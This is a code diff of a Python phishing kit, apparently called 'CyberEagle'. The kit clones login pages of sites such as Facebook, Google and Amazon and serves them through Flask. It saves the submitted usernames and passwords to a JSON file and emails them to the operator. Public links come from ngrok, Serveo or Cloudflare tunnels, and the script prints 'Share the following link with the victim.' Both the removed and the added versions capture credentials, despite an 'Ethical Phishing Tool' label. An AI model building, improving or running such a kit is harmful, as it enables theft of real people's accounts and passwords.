@@ -1,126 +1,249 @@
 import os
-import sys
-import logging
+import requests
+from flask import Flask, request, render_template_string
+from colorama import Fore, Style, init
+from datetime import datetime
+import json
+import smtplib
+from email.mime.text import MIMEText
+from bs4 import BeautifulSoup
 import subprocess
-from flask import Flask, render_template, request, redirect
-from pyfiglet import Figlet
+import time
 
-# Initialize Flask app
+# Initialize colorama
+init(autoreset=True)
+
+# Pre-defined list of websites for cloning
+WEBSITES = {
+    "1": "https://example.com",
+    "2": "https://www.wikipedia.org",
+    "3": "https://www.github.com",
+    "4": "https://www.google.com",
+    "5": "https://www.amazon.com",
+    "6": "https://www.facebook.com",
+    "7": "https://www.twitter.com",
+    "8": "https://www.instagram.com",
+    "9": "https://www.linkedin.com",
+    "10": "https://www.reddit.com",
+    "11": "https://www.netflix.com",
+    "12": "https://www.youtube.com",
+    "13": "https://www.ebay.com",
+    "14": "https://www.cnn.com",
+    "15": "https://www.bbc.com",
+    "16": "https://www.nytimes.com",
+    "17": "https://www.stackoverflow.com",
+    "18": "https://www.microsoft.com",
+    "19": "https://www.apple.com",
+    "20": "https://www.dropbox.com",
+    "21": "https://www.slack.com",
+    "22": "https://www.trello.com",
+    "23": "https://www.medium.com",
+    "24": "https://www.quora.com",
+    "25": "https://www.pinterest.com",
+}
+
+# CyberEagle Title in Big Font
+CYBEREAGLE_TITLE = f"""
+{Fore.CYAN}
+  ____          _          ______          _       
+ / ___|___   __| | ___    |  __ \\ ___  ___| | __   
+| |   / _ \\ / _` |/ _ \\   | |__) / _ \\/ __| |/ /   
+| |__| (_) | (_| |  __/   |  _  /  __/ (__|   <    
+ \\____\\___/ \\__,_|\\___|   |_| \\_\\___|\\___|_|\\_\\   
+{Style.RESET_ALL}
+"""
+
+# Email configuration (for notifications)
+EMAIL_HOST = "smtp.gmail.com"
+EMAIL_PORT = 587
+EMAIL_USER = "your_email@gmail.com"
+EMAIL_PASS = "your_email_password"
+EMAIL_RECEIVER = "receiver_email@gmail.com"
+
+# Step 1: Clone a Website (with assets and footer)
+def clone_website(url, output_dir):
+    try:
+        # Fetch the website content
+        response = requests.get(url)
+        if response.status_code == 200:
+            # Create the output directory if it doesn't exist
+            os.makedirs(output_dir, exist_ok=True)
+            
+            # Parse the HTML content
+            soup = BeautifulSoup(response.text, "html.parser")
+            
+            # Download and replace assets (CSS, JS, images)
+            for tag in soup.find_all(["link", "script", "img"]):
+                if tag.get("href"):
+                    asset_url = tag["href"]
+                    if not asset_url.startswith("http"):
+                        asset_url = requests.compat.urljoin(url, asset_url)
+                    asset_name = os.path.basename(asset_url)
+                    asset_path = os.path.join(output_dir, asset_name)
+                    with open(asset_path, "wb") as asset_file:
+                        asset_file.write(requests.get(asset_url).content)
+                    tag["href"] = asset_name
+                elif tag.get("src"):
+                    asset_url = tag["src"]
+                    if not asset_url.startswith("http"):
+                        asset_url = requests.compat.urljoin(url, asset_url)
+                    asset_name = os.path.basename(asset_url)
+                    asset_path = os.path.join(output_dir, asset_name)
+                    with open(asset_path, "wb") as asset_file:
+                        asset_file.write(requests.get(asset_url).content)
+                    tag["src"] = asset_name
+            
+            # Add a footer to the website
+            footer = soup.new_tag("footer", style="text-align: center; padding: 10px; background-color: #f1f1f1;")
+            footer.string = "Created By Cyber Eagle"
+            soup.body.append(footer)
+            
+            # Save the modified HTML content
+            with open(f"{output_dir}/index.html", "w", encoding="utf-8") as file:
+                file.write(str(soup))
+            print(f"Website cloned successfully to {output_dir}")
+        else:
+            print(f"Failed to fetch website. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Step 2: Set Up Flask App
 app = Flask(__name__)
 
-# Logging setup
-logging.basicConfig(filename='phish.log', level=logging.INFO, format='%(asctime)s - %(message)s')
-
-# Display CyberEagle banner
-def display_banner():
-    figlet = Figlet(font='slant')  # You can change the font (e.g., 'block', 'slant', 'script')
-    banner = figlet.renderText('CyberEagle')
-    print(banner)
-    print("Advanced Ethical Phishing Tool\n")
-
-# Phishing page routes
-@app.route('/')
-def home():
-    return "Welcome to EthicalPhishTool. Use this tool responsibly!"
-
-@app.route('/phish')
-def phish():
-    template = request.args.get('template')
-    if template in ['gmail', 'facebook', 'snapchat', 'instagram']:
-        return render_template(f'{template}.html')
-    else:
-        return "Invalid template selected."
-
-# Capture credentials
-@app.route('/capture', methods=['POST'])
-def capture():
-    email = request.form.get('email')
-    password = request.form.get('password')
-    logging.info(f"Captured credentials - Email: {email}, Password: {password}")
-    return redirect('https://gmail.com')  # Redirect to the real site
-
-# Start Ngrok
-def start_ngrok(port):
-    # Download Ngrok if not already present
-    if not os.path.exists('ngrok'):
-        print("Downloading Ngrok...")
-        if sys.platform == 'linux':
-            os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
-            os.system('unzip ngrok-stable-linux-amd64.zip')
-            os.system('rm ngrok-stable-linux-amd64.zip')
-        elif sys.platform == 'darwin':  # macOS
-            os.system('curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip')
-            os.system('unzip ngrok-stable-darwin-amd64.zip')
-            os.system('rm ngrok-stable-darwin-amd64.zip')
-        else:
-            print("Unsupported platform. Please download Ngrok manually.")
-            sys.exit(1)
-
-    # Start Ngrok
-    print("Starting Ngrok...")
-    ngrok_process = subprocess.Popen(['./ngrok', 'http', str(port)])
-    print("Ngrok started. Check the terminal for the public URL.")
-    return ngrok_process
-
-# Start LocalTunnel
-def start_localtunnel(port):
-    print("Starting LocalTunnel...")
-    localtunnel_process = subprocess.Popen(['npx', 'localtunnel', '--port', str(port)])
-    print("LocalTunnel started. Check the terminal for the public URL.")
-    return localtunnel_process
-
-# Start PageKite
-def start_pagekite(port):
-    print("Starting PageKite...")
-    pagekite_process = subprocess.Popen(['pagekite.py', str(port), 'your-subdomain.pagekite.me'])
-    print("PageKite started. Check the terminal for the public URL.")
-    return pagekite_process
-
-# Run the app
-if __name__ == '__main__':
-    # Display CyberEagle banner
-    display_banner()
-
-    # Prompt user to select a template
-    print("Select a phishing template:")
-    print("1. Gmail")
-    print("2. Facebook")
-    print("3. Snapchat")
-    print("4. Instagram")
-    choice = input("Enter the number of your choice: ")
-
-    # Map choice to template
-    templates = {
-        '1': 'gmail',
-        '2': 'facebook',
-        '3': 'snapchat',
-        '4': 'instagram'
+# Function to log captured data in JSON format
+def log_data(username, password):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    data = {
+        "timestamp": timestamp,
+        "username": username,
+        "password": password,
     }
-    selected_template = templates.get(choice, 'gmail')  # Default to Gmail if invalid choice
+    with open("captured_data.json", "a") as file:
+        file.write(json.dumps(data) + "\n")
 
-    # Prompt user to select a server
-    print("\nSelect a server:")
-    print("1. Ngrok (Public HTTPS)")
-    print("2. LocalTunnel (Public HTTPS)")
-    print("3. PageKite (Public HTTPS)")
-    print("4. Localhost (Local Testing)")
+# Function to send email notifications
+def send_email(username, password):
+    subject = "New Credentials Captured"
+    body = f"Username: {username}\nPassword: {password}"
+    msg = MIMEText(body)
+    msg["Subject"] = subject
+    msg["From"] = EMAIL_USER
+    msg["To"] = EMAIL_RECEIVER
+
+    try:
+        with smtplib.SMTP(EMAIL_HOST, EMAIL_PORT) as server:
+            server.starttls()
+            server.login(EMAIL_USER, EMAIL_PASS)
+            server.sendmail(EMAIL_USER, EMAIL_RECEIVER, msg.as_string())
+        print("Email notification sent successfully.")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Home Route - Serve Cloned Website
+@app.route("/")
+def home():
+    with open("phishing_page/index.html", "r", encoding="utf-8") as file:
+        cloned_page = file.read()
+    return cloned_page
+
+# Simulate Data Capture, Store Data, and Send Email
+@app.route("/submit", methods=["POST"])
+def submit():
+    username = request.form.get("username")
+    password = request.form.get("password")
+    
+    # Log the captured data
+    log_data(username, password)
+    
+    # Send email notification
+    send_email(username, password)
+    
+    # Display captured credentials in the terminal
+    print(f"\n{Fore.GREEN}Captured Credentials:{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}Username:{Style.RESET_ALL} {username}")
+    print(f"{Fore.YELLOW}Password:{Style.RESET_ALL} {password}")
+    
+    return """
+    <h1>Login Successful</h1>
+    <p>Thank you for logging in.</p>
+    """
+
+# Function to start a free server and generate a link
+def start_free_server(server_choice, port):
+    if server_choice == "1":
+        # Localhost
+        print(f"Running on localhost: http://localhost:{port}")
+        app.run(port=port)
+    elif server_choice == "2":
+        # Ngrok
+        print("Starting Ngrok...")
+        ngrok_process = subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(5)  # Wait for Ngrok to initialize
+        print("Ngrok is running. Share the following link with the victim:")
+        subprocess.run(["curl", "http://localhost:4040/api/tunnels"], stdout=subprocess.PIPE)
+    elif server_choice == "3":
+        # LocalTunnel
+        print("Starting LocalTunnel...")
+        lt_process = subprocess.Popen(["lt", "--port", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(5)  # Wait for LocalTunnel to initialize
+        print("LocalTunnel is running. Share the following link with the victim:")
+        for line in lt_process.stdout:
+            if "your url is:" in line.decode():
+                print(line.decode().strip())
+                break
+    elif server_choice == "4":
+        # PageKite
+        print("Starting PageKite...")
+        subprocess.run(["pagekite.py", str(port), "yourpagekite.pagekite.me"])
+    elif server_choice == "5":
+        # Serveo
+        print("Starting Serveo...")
+        subprocess.run(["ssh", "-R", "80:localhost:" + str(port), "serveo.net"])
+    elif server_choice == "6":
+        # LocalXpose
+        print("Starting LocalXpose...")
+        subprocess.run(["loclx", "http", "tunnel", "--to", str(port)])
+    elif server_choice == "7":
+        # Cloudflare Tunnel
+        print("Starting Cloudflare Tunnel...")
+        subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:" + str(port)])
+    else:
+        print("Invalid choice. Exiting.")
+        return
+
+# Main Function to Run the Tool
+def main():
+    # Display the CyberEagle title
+    print(CYBEREAGLE_TITLE)
+
+    # Display the list of pre-defined websites
+    print("Select a website to clone:")
+    for key, value in WEBSITES.items():
+        print(f"{key}. {value}")
+
+    # Get user input for website selection
+    choice = input("Enter the number of the website you want to clone: ")
+    if choice in WEBSITES:
+        target_url = WEBSITES[choice]
+        print(f"Cloning website: {target_url}")
+        clone_website(target_url, "phishing_page")
+    else:
+        print("Invalid choice. Exiting.")
+        return
+
+    # Server selection
+    print("\nSelect a server to run the tool:")
+    print("1. Localhost (http://localhost:5000)")
+    print("2. Ngrok (https://<your-subdomain>.ngrok.io)")
+    print("3. LocalTunnel (https://<your-subdomain>.loca.lt)")
+    print("4. PageKite (https://<your-subdomain>.pagekite.me)")
+    print("5. Serveo (https://<your-subdomain>.serveo.net)")
+    print("6. LocalXpose (https://<your-subdomain>.loclx.io)")
+    print("7. Cloudflare Tunnel (https://<your-subdomain>.trycloudflare.com)")
     server_choice = input("Enter the number of your choice: ")
 
-    port = 5000
-
     # Start the selected server
-    if server_choice == '1':
-        ngrok_process = start_ngrok(port)
-        print(f"Access the phishing page at: https://<ngrok-url>/phish?template={selected_template}")
-    elif server_choice == '2':
-        localtunnel_process = start_localtunnel(port)
-        print(f"Access the phishing page at: https://<localtunnel-url>/phish?template={selected_template}")
-    elif server_choice == '3':
-        pagekite_process = start_pagekite(port)
-        print(f"Access the phishing page at: https://<pagekite-url>/phish?template={selected_template}")
-    else:
-        print(f"Access the phishing page at: http://localhost:{port}/phish?template={selected_template}")
+    start_free_server(server_choice, port=5000)
 
-    # Start Flask app
-    print("Starting Flask app...")
-    app.run(host='0.0.0.0', port=port)
+if __name__ == "__main__":
+    main()
